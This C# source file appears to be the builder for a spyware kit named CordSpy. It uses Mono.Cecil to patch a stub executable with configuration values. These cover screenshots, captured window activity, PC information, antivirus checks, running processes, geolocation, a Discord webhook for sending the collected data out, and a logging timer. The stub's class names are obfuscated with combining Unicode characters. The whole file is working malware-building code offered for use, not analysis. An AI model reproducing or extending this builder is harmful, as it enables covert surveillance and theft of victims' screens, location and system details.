using Mono.Cecil;
using Mono.Cecil.Cil;
using System;
using System.IO;
using System.Linq;
namespace CordSpy.Compile
{
    internal class Compile
    {
        internal static void CreateExe(string _Output,string CurrentActivity, string PcInfo, string AntiVirus, string RunningProcesses, string Screenshot, string location,string Webhook,string LogsTimer)
        {
            try
            {
                AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(Path.GetTempPath() + "CordSpyStub.exe");
                foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition td) => td.FullName == "CordSpy_Stub.Options.C̶̳̱̃̏͆̿̍̈́̆u̴͙̣̍͋̉̄̈̆̈ŕ̶̡̖̙̖̺̌̈́ȑ̸̨̛̳̲͓̦͉̪̱͋̊̎̒̾̅̽͠ḝ̷͍̙̥̦̻͛̽̓̓ñ̴̢̹̺̞͍̟̂̏̓̌͝t̵͈͉͍̙͉̺͕͍̭̞͆̃́̍͝W̴̓̎̏͌̂̾̒͝ͅḭ̵̗͖̭͇͙͇̉́̒̕ņ̷̧͓̺̪̩̠̗̹̻̈́̓̉̅͒d̵̡̢̛̪͍̣͇̗̺̣̓̉̄͒̾͂͝ỏ̶̝̲͍̞̫̮͕̽ẇ̷̹̺̓̐̑̈̔̇͝").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction.Operand = CurrentActivity;
                        break;
                    }
                }
                foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition td) => td.FullName == "CordSpy_Stub.Options._P__c___I__n__f__o_").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction.Operand = PcInfo;
                        break;
                    }
                }
                foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition td) => td.FullName == "CordSpy_Stub.Options.A_n_t_i_V_i_r_u_s_").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction.Operand = AntiVirus;
                        break;
                    }
                }
                foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition td) => td.FullName == "CordSpy_Stub.Options.R͓̽u͓̽n͓̽n͓̽i͓̽n͓̽g͓̽P͓̽r͓̽o͓̽c͓̽e͓̽s͓̽s͓̽e͓̽s͓̽").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction.Operand = RunningProcesses;
                        break;
                    }
                }
                foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition td) => td.FullName == "CordSpy_Stub.Options.S̾c̾r̾e̾e̾n̾s̾h̾o̾t̾").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction.Operand = Screenshot;
                        break;
                    }
                }
                foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition td) => td.FullName == "CordSpy_Stub.Options.Ǧ̴̡̭͂̌̏͌ḛ̸̾̂͊͘͝o̷̢̙̽̌̈͐͒̈̾̄L̸̡̛̦͍̥̤̪̓̈́̐̒̒̄ͅo̴̧̻̻̩̯̘͕̿͒̃̇̕c̷̨̼͎͔͔̹̗͙͂͗̑̂à̴̧̬̫͕̞͙̮͑̈́̀̓̒͜͠ͅt̵̩̘̹̽̀́͌̍͝i̴̡̠̜̬͗́͜o̶̝͂͝͠ņ̴̱͈̼̘͙͈̘͋").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction.Operand = location;
                        break;
                    }
                }
                foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition td) => td.FullName == "CordSpy_Stub.Options.Ẁ̵̻͓͖̍̉̉̐̈̔͘̚ë̶̡̦͚̮͖̔ḅ̵̨̣̺̗͇͆h̴̨͖̘̻̬͕̠̫̀̔̃͋̿͝o̷͔̼͎̼͖͓̅̍̌̽̐́͆́̀͛o̵̻̲̤̲̝̖͑̄k̵̰̈́͌̈́̊͌̂̓̍̄").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction.Operand = Webhook;
                        break;
                    }
                }
                foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition td) => td.FullName == "CordSpy_Stub.Options.Ḷ̸̙̤͔̰̐̓̿̈́̓̕͠ò̸̧̱̙̗̦̍̆͝͝ͅg̴̨̝͎̙͈̹͛́́̽̀̈͌̋̐̀s̴̞̤͎̙̣̼̆̀̿͐̍̎͝Ț̶̘̮̮̞̮̼̘̈͊͂̌͘i̴̢̙̮͇͇̔́͊̇̅̌m̸̧̱͖̖̝̳͍̓̊̈ȇ̵̮̫̲̣̼̪̻͔̍̌̇̆̚̕͝͝͝").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction.Operand = LogsTimer;
                        break;
                    }
                }
                assemblyDefinition.Name.Name = "CordSpy";
                assemblyDefinition.Name.Version = new Version(1, 0, 0, 0);
                assemblyDefinition.Write(_Output);
            }
            catch (Exception e)
            {
                e.ToString();
            }
        }
    }
}
